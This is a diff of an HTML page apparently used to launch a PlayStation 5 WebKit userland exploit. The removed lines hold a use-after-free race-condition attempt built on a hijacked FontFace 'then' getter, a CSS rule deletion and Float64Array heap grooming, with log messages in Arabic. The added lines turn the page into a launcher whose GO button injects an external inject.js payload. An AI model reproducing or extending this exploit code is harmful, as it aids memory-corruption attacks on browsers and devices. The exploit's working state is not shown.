@@ -1,53 +1,49 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>PS5 SIMPLE USERLAND WEBKIT</title>
+    <style>
+        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding: 20px; }
+        #log-window { 
+            width: 90%; height: 400px; margin: 20px auto;
+            background: #0a0a0a; border: 1px solid #333; 
+            padding: 10px; overflow-y: auto; text-align: left; 
+            font-family: monospace; color: #00d9ff;
+        }
+        #exec-btn { 
+            padding: 15px 60px; font-size: 20px; font-weight: bold;
+            background: #007bff; color: white; border: none; 
+            border-radius: 8px; cursor: pointer; transition: 0.2s;
+            box-shadow: 0 4px 15px rgba(0, 123, 255, 0.4);
+        }
+        #exec-btn:active { background: #004085; transform: scale(0.95); }
+    </style>
+</head>
 <body>
-    <h3>[ARCHITECT] Synchronized U A F Race-Condition</h3>
-    <div id="log"></div>
-    <style id="s">@font-face { font-family: x; src: url(nonexistent-font.woff); }</style>
+    <h1>PS5 USERLAND WEBKIT BY SAMIRSCRIPTS</h1>
+    <div id="log-window">
+        <div style="color: #666;">[SYSTEM] Waiting for GO...</div>
+    </div>
+
+    <button id="exec-btn">GO</button>
 
     <script>
-        const log = (m) => document.getElementById('log').innerHTML += m + "<br>";
-        
-        async function exploit() {
-            let fired = false;
-            let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-            document.fonts.add(A);
-
-            Object.defineProperty(FontFace.prototype, 'then', {
-                configurable: true,
-                get() {
-                    if (!fired) {
-                        fired = true;
-                        log("[*] Race Condition: استدعاء التحرير...");
-                        document.getElementById('s').sheet.deleteRule(0);
-                        
-                        // التوقيت الحرج: فرض التزامن
-                        document.body.offsetTop; 
-
-                        // الـ Reallocation الفوري:
-                        // محاولة وضع الـ Victim في مكان الـ FontFace المحرر
-                        let victim = new Float64Array(16);
-                        victim.fill(0x42424242);
-                        log("[+] التخصيص الفوري تم (Grooming Inside Race).");
-                    }
-                    return undefined;
-                }
-            });
-
-            log("[*] بدء التحميل...");
-            try {
-                document.fonts.load('1em x', 'A');
-            } catch(e) { log("Error: " + e); }
-
-            // التحقق
-            setTimeout(() => {
-                log("[*] فحص النتيجة...");
-                // إذا لم ينهار المتصفح، الـ Victim قد احتل مكان الـ CSSFontFace
-                log("[+] تم الانتهاء. راجع سجل التصحيح (Debugger) للتحقق من الـ Butterfly.");
-            }, 500);
+        function ssa(msg) {
+            const win = document.getElementById('log-window');
+            const line = document.createElement('div');
+            line.innerHTML = "<span style='color: #fff;'>[>]</span> " + msg;
+            win.appendChild(line);
+            win.scrollTop = win.scrollHeight;
         }
 
-        exploit();
+        document.getElementById('exec-btn').onclick = function() {
+            ssa("EXECUTING INJECT.JS");
+            
+            // This creates a fresh script tag every time you click
+            var script = document.createElement('script');
+            script.src = 'inject.js?t=' + Math.random(); // prevents caching
+            document.body.appendChild(script);
+        };
     </script>
 </body>
 </html>
